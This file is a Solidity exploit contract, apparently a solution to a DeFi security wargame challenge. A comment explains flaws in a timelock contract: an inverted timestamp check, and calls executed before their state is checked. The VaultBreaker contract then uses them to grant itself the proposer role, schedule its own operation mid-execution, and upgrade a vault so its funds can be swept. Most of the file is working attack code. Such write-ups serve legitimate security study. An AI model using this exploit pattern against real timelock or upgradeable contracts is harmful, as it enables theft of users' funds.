/**
This contract exploits a pair of flaws in the ClimberTimelock contract logic.

Relevant function:

function getOperationState(bytes32 id) public view returns (OperationState) {
    Operation memory op = operations[id];

    if(op.executed) {
        return OperationState.Executed;
    } else if(op.readyAtTimestamp >= block.timestamp) { 
        return OperationState.ReadyForExecution;
    } else if(op.readyAtTimestamp > 0) {  
        return OperationState.Scheduled;
    } else {
        return OperationState.Unknown;
    }
}

This function is intended to provde the 'timelock' functionality of the 
contract. The intention is that a scheduled job (Operation) must sit in the
queue for 1 hour before execution. 

The `getOperationState()` function contains erroneous logic to check for the 
readiness of an 'operation' at a given block timestamp. (line 11 above) The 
sense of the comparison operator is inverted, perhaps because at one time the
order of the comparison was reversed. As written, the expression will evaluate 
to true when the block timestamp has not exceeded the desired time of 
operation. Once the default timelock span (one hour) is passed, the comparison
will evaluate to false. The logic will then fall through to the non-0 check of
the desired timestamp. The operation will be permanently hung at 'Scheduled'.

Bypassing the timelock itself is moderate in severity. 

The second flaw is in the execution of scheduled events.

function execute(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external payable {
    require(targets.length > 0, "Must provide at least one target");
    require(targets.length == values.length);
    require(targets.length == dataElements.length);

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; i++) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    require(getOperationState(id) == OperationState.ReadyForExecution);
    operations[id].executed = true;
}

The primary issue here is the combination of allowing any address to call the 
function (no onlyOwner modifier or similar), with the incorrect ordering of 
the checks and interactions inside the function.

The intention is that, since only the trusted PROPOSER role is able to add 
operations to the queue, it shouldn't matter who calls `execute` in the end.

The `execute` function actually executes the requested operation(s) no matter 
what (line 45 above) however, and only reverts any effects if the final check 
on `getOperationState` fails. (line 48) Operations are initialized with the 
OperationState enum set to Unknown (0). So by default, an attacker would be 
stymied because the operations submitted will fail the check for 
ReadyForExecution (just not in the intended way).

However, because all submitted operations are executed before this crucial 
check, an attacker has margin to exploit the logic further. Specifically, any 
state change will be valid until the entire call reverts. Up to 255 operations 
can be submitted in one transaction (`uint8 i = 0`). As long as any given set 
of operations can be submitted via `schedule` successfully before the check on
OperationState is performed, the whole batch will succeed.

The contract below exploits this. It first submits a pair of operations in one 
call to `execute`. The first uses the Timelock contract's `grantRole` function 
to give itself the PROPOSER role. It then calls itself (via `resolveCallOne`) 
to schedule the pair of operations that are currently executing. This will 
succeed because at this point in execution, the contract holds the PROPOSER 
role. Once the `schedule` function returns, the whole stack unwinds and the 
operations will pass the `OperationState` check (and the invalid timelock logic
 will kick in, allowing immediate execution).

Now that the PROPOSER role is permanently held by the contract, a second call 
is made to `schedule` in order to create a malicious upgrade of the 
ClimberVault contract. The vault is subverted to remove a critical modifier on
the `sweepFunds()` function, allowing anyone to remove all ERC-20 tokens from 
the vault.
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultBreaker {

    // Stores the address of the TimeLock contract, for use across the two calls subverting the scheduler.
    address public target;
    
    // Stores a set of selectors for easy reading later.
    bytes4 constant JUST_UPGRADE = bytes4(keccak256("upgradeTo(address)"));
    bytes4 constant RESOLVE_CALL_ONE_SELECTOR = bytes4(keccak256("resolveCallOne()"));
    bytes4 constant GRANT_ROLE = bytes4(keccak256("grantRole(bytes32,address)"));
    bytes4 constant SCHEDULE = bytes4(keccak256("schedule(address[],uint256[],bytes[],bytes32)"));
    bytes4 constant EXECUTE = bytes4(keccak256("execute(address[],uint256[],bytes[],bytes32)"));
    
    // SALT value and the bytes32 of the role we want
    bytes32 constant SALT1 = 0x9fd09c38c2a5ae0a0bcd617872b735e37909ccc05c956460be7d3d03d881a0dc;
    bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
    
    
    function returnResolveCallOne() public pure returns (bytes memory) {
        return abi.encodeWithSelector(RESOLVE_CALL_ONE_SELECTOR);
    }
    
    function returnGetProposerRole() public view returns (bytes memory) {
        return abi.encodeWithSelector(GRANT_ROLE, PROPOSER_ROLE, address(this));
    }

    function returnUpgradeTo(address _newVault) public pure returns (bytes memory) {
        return abi.encodeWithSelector(JUST_UPGRADE, _newVault);
    }

    function returnOperation(address _target) public view returns(address[] memory, uint256[] memory, bytes[] memory) {
        address[] memory targets = new address[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        targets[0] = _target;
        targets[1] = address(this);
        datas[0] = returnGetProposerRole();
        datas[1] = returnResolveCallOne();
        return (targets, values, datas);
    }

    // first call to execute, sends grantRole and second contract call
    function callOne(address _target) external {
        // We do this here so that it can be reused during resolveCallOne
        target = _target;
        // This call kicks off the execution, with the second call in the set a call to resolveCallOne, 
        // while the first sets this attacking contract as a PROPOSER (via returnGetProposerRole). As a 
        // proposer, the schedule call in the next function will succeed.
        (address[] memory targets, uint256[] memory values, bytes[] memory datas) = returnOperation(target);
        (bool success, bytes memory _msg) = target.call(abi.encodeWithSelector(EXECUTE, targets, values, datas, SALT1));
        require(success, string(_msg));
    }

    function resolveCallOne() external {
        // This call sets the previous exec call in the scheduler, in order to pass the existence check. As long as
        // the scheduled task is executed inside of the same hour, it will automatically pass the intended timelock check
        // that should exclude it. However, the exec will still fail because the Enum is initalized to a 0 value, which
        // also won't pass the check. This call causes the malicious job to be set as a real scheduled job.
        (address[] memory targets, uint256[] memory values, bytes[] memory datas) = returnOperation(target);
        (bool success, bytes memory _msg) = target.call(abi.encodeWithSelector(SCHEDULE, targets, values, datas, SALT1));
        require(success, string(_msg));
    }

    function upgradeVault(address _oldVault, address _newVault) external {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory datas = new bytes[](1);
        targets[0] = _oldVault;
        datas[0] = returnUpgradeTo(_newVault);
        
        // schedule and execute upgrading the vault to a vault whose check on the sweeper has been removed, and the 
        // destination of the sweept is set to msg.sender.
        (bool success1, bytes memory _msg1) = target.call(abi.encodeWithSelector(SCHEDULE, targets, values, datas, SALT1));
        require(success1, string(_msg1));
        (bool success2, bytes memory _msg2) = target.call(abi.encodeWithSelector(EXECUTE, targets, values, datas, SALT1));
        require(success2, string(_msg2));
    }
}
